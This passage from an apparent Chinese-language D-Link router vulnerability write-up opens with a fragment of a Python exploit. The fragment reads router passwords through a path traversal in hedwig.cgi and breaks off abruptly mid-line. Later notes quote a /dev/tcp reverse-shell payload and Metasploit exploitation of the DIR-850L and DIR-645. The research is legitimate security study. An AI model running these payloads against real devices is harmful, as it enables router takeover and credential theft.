    try:
        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    except:
        pass
    TARGET = sys.argv[1]
    session = requests.Session()
    session.verify = False
    ############################################################
    print("Get password...")
    headers = {"Content-Type": "text/xml"}
    cookies = {"uid": "whatever"}
    data = """
        ../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml
    """
    resp = session.post(urljoin(TARGET, "/hedwig.cgi"), headers=headers, cookies=cookies, data=data)
    # print(resp.text)
    # getcfg: ...
    # hedwig: 
    #       : ...
    accdata = resp.text[:resp.text.find("
可以搜索到很多这类设备，即使过了1年多，漏洞影响还是蛮大的。
**遇到的问题** ：
  * 在win7下运行最新版jeb需要 **MSVCR100.DLL** 。
  * 反编译MIPS代码，可以使用两种工具： [**IDA的Retdec插件**](https://github.com/avast-tl/retdec-idaplugin) 和 [**JEB Decompiler for MIPS**](https://www.pnfsoftware.com/jeb/mips) 。本次分析中，我使用的是 **JEB Decompiler for MIPS** ，由于没接触过逆向， **JEB** 反汇编出来的代码只能看个大概。在 **JEB** 试用版中禁止复制反汇编后的代码，但是可以直接用 **Ctrl+X** 剪切来复制代码。试用版中，有些代码需要购买正版才能完全反汇编。关于这两个工具的更多使用，可以参考以下几篇文章：
Retdec 能反mips 源码的IDA插件了解一下：
java应用破解之破解 jeb mips 2.3.3：
JEB官方手册：
  * 看了很多分析文章中，没有提及为什么在远程敏感信息获取的 **payload** 中要有一个 **%0a** 。解决这个问题，还是要看cgibin反汇编后的代码才好理解。其实就是上面分析中的 **\n** ， **\n** 对应ASCII码为10，转成url编码就是 **%0a** 。
  * 有很多PHP函数是无法搜索到定义的，估计是写在拓展插件中了。如果要查看其定义，可能要再逆一下 **.so** 文件，这里我并没有继续逆 **.so** 文件。
  * 在测试 **fatlady.php** 文件的任意文件读取时，我的POC无法攻击成功。后来根据网络上的攻击POC，抓取其发送的数据包对比修正后，可以攻击成功。主要问题是 **Cookie** 少了 **uid** 字段，而且 **Content-Type** 要设计成 **text/xml** 。
  * 在还原 **D-Link 850L** 的 **通过LAN、WLAN的远程命令执行** 漏洞过程时，用 **sh -i >& /dev/tcp/AttackIP/666 0>&1** payload并不能成功反弹 **shell** ，但是 **metasploit** 却可以反弹回来。查看了 **dlink_dir850l_unauth_exec.rb** 程序源代码，在 **server** 标签中随机生成8个字符。这里猜测8个字符应该是MSF的 **shellcode** 经过编译后的程序名，之后在 **/var/tmp** 目录下确实发现了该程序。
  * 在复现 **D-Link 645** 的 **通过LAN、WLAN的远程命令执行** 漏洞时，直接使用 **MSF** 的 **dlink_dir850l_unauth_exec** 攻击程序，并不能收到反弹回来的 **shell** ，估计是 **shellcode** 不适配，这里我就使用 **ceye.io** 平台先测试目标是否执行了命令。
  * [**AttifyOS1.3**](https://github.com/adi0x90/attifyos) 是一个专门用于测试 **IOT** 设备的系统，默认账号密码是：`oit` : `attify123` 。本来想用这个系统搭建路由环境，还原一下 **D-Link 850L** 的 **LAN下的命令执行** 漏洞，但是没成功。
## 五、参考
[D-link 10个0Day漏洞分析（附细节）](http://www.freebuf.com/vuls/147445.html)  
[SSD Advisory – D-Link 850L Multiple Vulnerabilities (Hack2Win
Contest)](https://blogs.securiteam.com/index.php/archives/3364)  
[D-Link 路由器信息泄露和远程命令执行漏洞分析及全球数据分析报告](https://paper.seebug.org/385/)  
[D-Link-Dir-850L-远程命令执行漏洞](https://xz.aliyun.com/t/90)  
[D-Link DIR-850L 路由器漏洞验证报告](https://gorgias.me/2017/08/11/D-Link-DIR-850L-路由器漏洞验证报告/)  
[D-Link系列路由器漏洞挖掘入门](https://paper.seebug.org/429/)  
[D-Link DIR
系列路由器信息泄露与远程命令执行漏洞](https://blog.jenisec.org/security/dlinkRce.html)  
[逆向路由器固件之动态调试](http://xdxd.love/2016/09/20/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/)  
[关于D-Link DIR 8xx漏洞分析](http://www.qingpingshan.com/pc/aq/330349.html)